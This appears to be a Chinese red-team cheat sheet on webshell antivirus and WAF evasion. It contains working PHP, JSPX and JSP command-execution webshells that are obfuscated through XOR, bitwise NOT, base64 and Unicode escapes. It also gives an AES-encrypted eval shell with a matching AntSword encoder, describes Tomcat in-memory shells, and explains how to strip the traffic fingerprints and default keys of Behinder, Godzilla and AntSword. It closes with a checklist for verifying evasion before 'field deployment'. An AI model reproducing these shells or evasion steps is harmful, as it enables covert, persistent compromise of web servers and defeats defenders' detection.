# WebShell 免杀与流量规避速记

## 0x01 概述

这一类问题通常分成两部分：

- 落地阶段：文件、本地进程、行为特征被查杀。
- 通信阶段：HTTP 请求特征、参数内容、固定 UA 或固定编码方式被设备拦截。

目标不是追求“绝对免杀”，而是尽量降低静态特征和流量特征。

## 0x02 文件落地侧思路

- 避免固定文件名、固定目录、固定时间戳。
- 避免明显的工具特征字符串。
- 尽量减少长期驻留文件，能内存执行就不要持续落地。
- 配合系统原生命令或已有解释器，减少额外二进制上传。

## 0x03 通信侧思路

- 请求头尽量贴近正常业务流量。
- 降低固定参数名、固定数据格式的重复出现。
- 对高特征内容做变形编码，但要控制长度和可还原性。
- 请求频率不要过于机械，避免形成明显心跳特征。

## 0x04 常见排查方向

如果怀疑被 WAF 或代理拦截，可以先检查：

1. 同一命令在不同参数位置是否结果一致。
2. 简单命令和复杂命令是否只有复杂命令失败。
3. GET 与 POST 是否存在明显差异。
4. 是否只有特定关键字触发拦截。

## 0x05 工具改造记录

- 双 Base64 编码器
- 调整请求头、请求体和参数名
- 降低固定特征字符串

参考：

- [对蚁剑的相关改造及分析](https://www.crisprx.top/archives/382)

## 0x06 PHP WebShell 免杀实例

### 1. 一句话变形：无特征函数名

```php
<?php $_GET[0]($_POST[1]);
```

- 文件内不出现任何函数名字面量：函数名走 GET、参数走 POST，用法 `?0=system` + POST `1=whoami`。
- PHP 5.x 还可 `?0=assert` 直接执行代码；PHP 7.2 起 `assert` 不再执行字符串参数。
- 弱点：`$_GET[x]($_POST[y])` 这种"变量函数"结构本身已进特征库（D 盾会报可疑变量函数），实战需再叠加注释、拼接、中转赋值等稀释手段。

### 2. 编码类变形

Base64 回调（函数名走 base64）：

```php
<?php $f=base64_decode($_POST['a']);$f($_POST['b']);
```

- `a=YXNzZXJ0`（assert）/ `a=c3lzdGVt`（system），`b` 传命令。
- 优点是文件里没有明文函数名；缺点是"base64_decode 的结果直接当函数用"同样是被盯防的高频组合。

异或免杀（控制字符与反引号异或逐字拼出 `assert`）：

```php
<?php
$_=("\x01"^"`").("\x13"^"`").("\x13"^"`").("\x05"^"`").("\x12"^"`").("\x14"^"`"); // assert
$_($_POST['x']);
```

- 原理：`chr(0x01)^chr(0x60)='a'`，以此类推；换成 `~` 取反、加法、自增同理。
- 异或表用脚本批量生成（对目标函数名逐字符求 `ord(c)^0x60`），可随意更换运算符与掩码做个人化变形，避免用网传原版被特征化。

### 3. 无字母数字 WebShell（PHP 7 取反）

PHP 7 支持任意表达式作函数名，`~` 取反后函数名全是不可见字节，静态特征码无从匹配：

```php
<?php
(~"\x8c\x86\x8c\x8b\x9a\x92")(~"\x88\x97\x90\x9e\x92\x96");  // system("whoami")
```

参数外置版（更实用，命令从 POST 进）：

```php
<?php
$_=~"\x8c\x86\x8c\x8b\x9a\x92";   // 取反还原为 system
$_($_POST[0]);
```

- `"\x8c\x86\x8c\x8b\x9a\x92"` 取反即 `system`；`"\x9e\x8c\x8c\x9a\x8d\x8b"` 取反即 `assert`（PHP < 7.2 可执行任意 PHP 代码）。
- 实战免杀只需要"函数名不可见"；CTF 严格校验（文件内不允许出现任何字母数字）时，连 `$_POST` 都要换成异或/取反构造的变量名，或用数组自增（`$_=[];$_=@"$_";` 取出字符后递增）拼字母。

### 4. 自定义加密协议：蚁剑编码器

消灭"流量明文"这个最大特征：客户端与服务端约定私有加解密协议，HTTP 报文里只剩密文。蚁剑的编码器（Encoder）是一段在请求发出前执行的 JS 模块，放在蚁剑 `source/core/php/encoder/` 目录下，即可在连接配置的编码器列表中选用。

编码器示例（AES-CBC 加密整个 payload，仅依赖 Node 内置 crypto）：

```js
// 保存为 encoder/aes.js，连接时选择该编码器
'use strict';
const crypto = require('crypto');

module.exports = (pwd, data, ext = {}) => {
  const key = Buffer.from('MyPassw0rd!12345');   // 16 字节 AES-128 密钥，与服务端 shell 一致
  const iv  = Buffer.from('0102030405060708');   // 16 字节 IV
  const cipher = crypto.createCipheriv('aes-128-cbc', key, iv);
  // 原始 payload 在 data['_'] 中，加密后放入密码参数
  const ciphertext = Buffer.concat([
    cipher.update(Buffer.from(data['_'], 'utf8')),
    cipher.final()
  ]).toString('base64');
  data[pwd] = ciphertext;  // 流量中不再出现 eval/assert/明文 PHP 代码
  delete data['_'];        // 删除默认明文字段
  return data;
};
```

配套服务端（一句话只剩"解密 + 执行"两个动作）：

```php
<?php
// flags=0：输入按 base64 解码，自动去 PKCS7 填充
@eval(openssl_decrypt($_POST['ant'], 'AES-128-CBC', 'MyPassw0rd!12345', 0, '0102030405060708'));
```

要点：

- 密钥别长期固定一个：改成每次请求随机生成、藏在 Cookie / 自定义头里带回，可防"拿到密钥离线解密历史流量"（冰蝎 3.0 固定密钥被通杀就是这个教训）。
- 服务端无 openssl 扩展时降级为 XOR+base64 解密（冰蝎 3.0 官方 shell 的降级逻辑即是如此）。
- 蚁剑内置 base64 / chr / rot13 等基础编码器，官方文档另有 RSA 编码器开发样例；解码器（Decoder）用同样机制处理服务端回传数据。0x05 的"双 Base64 编码器"是同一套体系里的低配版。

## 0x07 JSP/JSPX 免杀实例

### 1. 基础姿势先看这里

EL 表达式执行、jspx 自定义前缀、脏数据稀释、完整 WebShell 模板与各家 WAF 检测差异，已在 [EXP-Upload-JSP.md](../exp/EXP-Upload-JSP.md) 系统整理（含可直接落地的模板），本节只记增量姿势。

### 2. jspx 自定义标签变形

核心套路：过滤器只拦 `jsp:scriptlet` 字面量时，命名空间前缀可任意换（命名空间值必须保持 `http://java.sun.com/JSP/Page`），配合脏数据头与字符串拼接稀释特征：

```xml
<x xmlns:x="http://java.sun.com/JSP/Page" version="2.0">
    <x:directive.page contentType="text/html;charset=UTF-8"/>
    <x:scriptlet>
        Object rt = Class.forName("java.lang." + "Runtime").getMethod("get" + "Runtime").invoke(null);
        Process p = (Process) rt.getClass().getMethod("exec", String.class).invoke(rt, request.getParameter("c"));
        java.util.Scanner sc = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
        out.println(sc.hasNext() ? sc.next() : "no output");
    </x:scriptlet>
</x:root>
```

- 变形空间：前缀任意、`version` 可在 2.0/2.1/2.2 间换、`<jsp:text>` 内嵌 EL 链、外层再包大段无害标签——公共目标是让单关键字规则（`<%`、`scriptlet`、`Runtime`、`getParameter+exec` 组合）全部落空。
- 带回显的完整模板与 EL 反射版见 [EXP-Upload-JSP.md](../exp/EXP-Upload-JSP.md)「完整 WebShell 模板」。

### 3. Unicode 编码 class 名与关键字

Java 编译器在词法分析之前就处理 `\uXXXX` 转义，因此不只是字符串字面量——**类名、方法名、关键字本身都能转义**，全文不出现 `Runtime`/`exec` 字面量：

```jsp
<%
    // "java.lang.Runtime" / "getRuntime" / "exec" 全部 unicode 化
    Object rt = Class.forName("\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065")
        .getMethod("\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065").invoke(null);
    Object p = rt.getClass().getMethod("\u0065\u0078\u0065\u0063", String.class)
        .invoke(rt, request.getParameter("c"));
    Object ins = p.getClass().getMethod("getInputStream").invoke(p);
    java.util.Scanner sc = new java.util.Scanner((java.io.InputStream) ins).useDelimiter("\\A");
    out.println(sc.hasNext() ? sc.next() : "no output");
%>
```

- 标识符同样可转义（如 `\u0053ystem` 等价于 `System`），这是 JSP 相对 PHP 更灵活的免杀面。
- 与 jspx 前缀变形叠加：把 `<% %>` 换成 `<x:scriptlet>`，等于"无尖括号脚本 + 无明文关键字"双免杀。
- 生成方式：对目标字符串逐字符 `String.format("\\u%04x", (int) c)`，脚本一键转换。

### 4. 内存马：无文件落地

- 原理（Tomcat）：通过反射拿到 `StandardContext`，向其中动态注册恶意组件，恶意逻辑以类字节码形式驻留 JVM（`defineClass` 加载），注入完成后落地文件即可删除——文件完整性校验、Web 目录定期扫描、EDR 文件监控对它全部失效。
  - Filter 型：注册 FilterDef + FilterMap 挂到指定 URL，在 `doFilter` 里从请求头/参数取数据执行，客户端像访问普通接口一样连接。
  - Listener 型：注册 `ServletRequestListener`，在 `requestInitialized` 事件里判断特定请求头触发执行，不依赖 URL 映射，比 Filter 型更隐蔽。
- 工具：
  - 冰蝎 3.0 内置 Java 内存马功能，支持注入与一键卸载，注入源可以是临时上传的 jsp/jspx（注入完即删）。
  - 哥斯拉内置 `MemoryShell` 插件，支持哥斯拉 / 冰蝎 / 菜刀 / ReGeorg 四类内存 shell 的注入与卸载。

## 0x08 流量特征对抗

### 1. 冰蝎 Behinder

- 2.x：动态密钥协商——首包 GET，服务端生成 16 字节随机密钥写入 Session 并返回（Content-Length: 16），此后 AES 加密通信。
- 3.x：密钥固定为 md5(连接密码) 的前 16 位，默认密码 `rebeyond` → **默认密钥 `e45e329feb5d925b`**，AES-128-CBC（零 IV）。检测方拿这个 key 就能离线解密全部流量做内容审计，这是"固定密钥"最大的软肋。
- 4.x：支持自定义传输协议（加密算法可换成任意 Java 实现），默认保留 xor_base64 / aes 两种。
- 其他指纹：Accept 固定为 `text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2`（JDK HttpURLConnection 默认值）；JSP shell 首包 `Content-Type: application/octet-stream`；**User-Agent 可在客户端配置里自定义**（内置一批老 UA 轮换）。

### 2. 哥斯拉 Godzilla

- 默认密码 `pass`（即请求参数名），加密密钥为 md5(pass) 的前 16 位 = `3c6e0b8a9c15224a`。
- 内置 3 类 Payload + 6 种加密器：JAVA_AES_BASE64 / JAVA_AES_RAW（jsp、jspx）、CSHAP_AES_BASE64（aspx/asmx/ashx）、PHP_XOR_BASE64 / PHP_XOR_RAW——BASE64 系编码器的**流量整体呈大段 base64**，是最直观的旁路特征。
- 响应体强特征：`md5前16位 + base64(AES(gzip(结果))) + md5后16位` 的三段结构；请求 Cookie 末尾带 `;`；默认 UA 形如 `Java/1.8.0_121`（随 JDK 版本变化）。
- Java 环境常用组合：jspx 落地文件（叠加上一节的标签/unicode 变形）+ JAVA_AES_BASE64 加密器，静态与流量两层同时收敛。

### 3. 蚁剑 AntSword

- 默认近乎**明文**：URL 解码后请求体以 `ini_set(display_errors,0);set_time_limit(0);` 开头，可见 `eval(`/`assert(` 调用；老版本 UA 还带 `antSword/v2.x` 版本标识——三者中最易被识别。
- 修复面全部开放：编码器可换可自写（base64 / rot13 / chr / 自定义 AES、RSA，见 0x06 第 4 节），参数名、UA、请求头均可配置——改造成本最低、见效最快。

### 4. 检测规则从哪来

一句话：防御方从 ATT&CK T1505.003（Server Software Component: Web Shell）行为链出发做"落地文件 + 持久化 + 异常外连"关联分析；各家 WAF/NDR 的特征规则则从公开样本提取——对固定密钥、固定请求头/UA、固定参数名做正则，高级规则直接"用默认密钥解密成功即判黑"。

### 5. 自定义改造三步法

1. **改密钥**：默认密钥（`e45e329feb5d925b` / `3c6e0b8a9c15224a`）全部换掉，进一步做一次一密（随机密钥随请求带回 / 会话密钥协商）。
2. **改请求参数名**：`pass` / `ant` / `_0x` 系参数名换成业务化名字（`id`、`token`、`data`），顺带清理 `_0x` 随机前缀参数。
3. **改加密算法**：AES 换 3DES / RC4 / 自写异或流密码，或只换分组模式与填充方式——让"默认密钥解密即报警"与密文指纹规则同时失效。冰蝎 4.0 传输协议自定义、哥斯拉二次开发（如 Z-Godzilla_ekp）本质都在做这一步。

## 0x09 落地免杀检查清单

- **VT 查杀测试**：VirusTotal 传样本看多引擎报毒名；红队注意 VT 会把样本分发给各杀软厂商，未定稿样本慎传（或改 hash 后分批验证），重要项目优先本地引擎。
- **D 盾 / 河马本地查杀**：D 盾对 PHP/ASP 特征码覆盖最全（报风险等级，重点看"可疑变量函数/后门"类提示）；河马对加密变形 shell 检出较好，两者全过再往下走。
- **微步在线沙箱**：动态行为层——观察落地后的进程创建、文件写入、外连行为是否暴露；内存马重点验证注入动作本身。
- **流量自查**：本地代理（Burp）完整走一遍连接 + 文件管理 + 命令执行，对照 0x08 逐项核对：无默认密钥、无固定 UA、无 `_0x`/`pass` 参数名、无大段可解 base64。
- **三层结论**：静态（本地引擎 + VT 双过）→ 行为（沙箱无高危动作）→ 流量（无已知指纹），三层全绿再实战投放；投放后仍按 0x02/0x03 原则控制文件名、时间戳与请求频率。

## Reference

1. [对蚁剑的相关改造及分析](https://www.crisprx.top/archives/382)
2. [Tas9er/ByPassGodzilla - 哥斯拉 WebShell 免杀生成](https://github.com/Tas9er/ByPassGodzilla)
3. [Tas9er/ByPassBehinder - 冰蝎 WebShell 免杀生成](https://github.com/Tas9er/ByPassBehinder)
4. [rebeyond/Behinder - 冰蝎（官方）](https://github.com/rebeyond/Behinder)
5. [BeichenDream/Godzilla - 哥斯拉（官方）](https://github.com/BeichenDream/Godzilla)
